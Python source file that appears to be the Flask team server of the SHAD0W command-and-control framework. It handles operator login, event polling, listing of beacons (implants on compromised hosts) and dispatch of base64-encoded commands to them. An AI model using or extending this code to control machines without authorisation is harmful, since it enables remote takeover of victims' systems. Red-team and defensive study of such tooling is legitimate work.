import sys
import base64
import asyncio
import logging

from .path_handler import Handler
from lib import mirror, buildtools

from OpenSSL import SSL
from flask import Flask, request, jsonify, Response, make_response

# shut flask output up
log                    = logging.getLogger('werkzeug')
log.disabled           = True
cli                    = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None

loop = asyncio.get_event_loop()
app = Flask(__name__)

class TeamServer(object):
    def __init__(self, arg):
        global auth_obj
        super(TeamServer, self).__init__()

        self.config = arg

    @app.route("/")
    def teamserver_base():
        return "SHAD0W Team Server"

    @app.route("/login", methods=["POST"])
    def teamserver_login_user():
        """
        Login a user into the team server
        """
        global auth_obj

        error   = False
        success = False

        jdata = request.get_json(force=True)

        try:
            username = jdata["username"]
            password = jdata["password"]
        except KeyError:
            error = True

        teamsrv.shad0w.event.debug_log(f"Trying to login '{username}'")

        loggedin, cookie = teamsrv.auth_obj.login(username, password)

        if loggedin:
            teamsrv.shad0w.event.debug_log(f"Logged in '{username}'")
            teamsrv.shad0w.event._add_new(cookie)
            success = True
        else:
            teamsrv.shad0w.event.debug_log(f"Login for '{username}' failed")

        response = {"success": False}

        if success:
            response['success'] = True

        res = make_response(jsonify(response))
        if success: res.set_cookie('SDWAuth', cookie)
        return res

    @app.route("/poll")
    def teamserver_poll_c2():
        """
        Get infomation from the C2.
        """

        # get the cookie
        cookie = request.cookies.get("SDWAuth")

        # check it is valid
        _, valid = teamsrv.auth_obj.validate_cookie(cookie)
        if valid is False:
            return jsonify({"failed": True})

        # get the events in a json format
        events = jsonify(teamsrv.shad0w.event.event_buffer[cookie])

        # clear the events
        teamsrv.shad0w.event._clear_buffer(cookie)

        return events

    @app.route("/beacons")
    def teamserver_get_beacons():
        """
        Give infomation to the client about the current beacons. 
        """

        # get the cookie
        cookie = request.cookies.get("SDWAuth")

        # check it is valid
        _, valid = teamsrv.auth_obj.validate_cookie(cookie)
        if valid is False:
            return jsonify({"failed": True})

        teamsrv.shad0w.event.debug_log("Handling request for registered beacons")

        events = jsonify(teamsrv.shad0w.beacons)

        return events


    @app.route("/cmd", methods=["POST"])
    def teamserver_run_command():
        """
        Run a command on a beacon
        """

        error = False
        success = False

        response = {"success": False}

        # get the cookie
        cookie = request.cookies.get("SDWAuth")

        # check it is valid
        _, valid = teamsrv.auth_obj.validate_cookie(cookie)
        if valid is False:
            return jsonify({"failed": True})

        # get the command from the json data
        jdata = request.get_json(force=True)
        try:
            cmd = jdata["cmd"]
            beacon = jdata["beacon_id"]
        except KeyError:
            error = True

        if len(cmd) == 0:
            return jsonify({"failed": True})

        # base64 decode the command
        cmd = base64.b64decode(cmd).decode()

        # display infomation
        teamsrv.shad0w.event.debug_log("Running command: '" + cmd + "'")

        # run the command
        loop.run_until_complete(teamsrv.cmd_handler.do(cmd, beacon))

        return jsonify({"success": True})

    def start_running(*args):
        global teamsrv

        teamsrv = args[1]

        try:
            app.run(host=teamsrv.addr, port=teamsrv.port, ssl_context=(teamsrv.cert, teamsrv.key))
        except FileNotFoundError:
            print("[!] Failed to find ssl cert and key")
            exit()

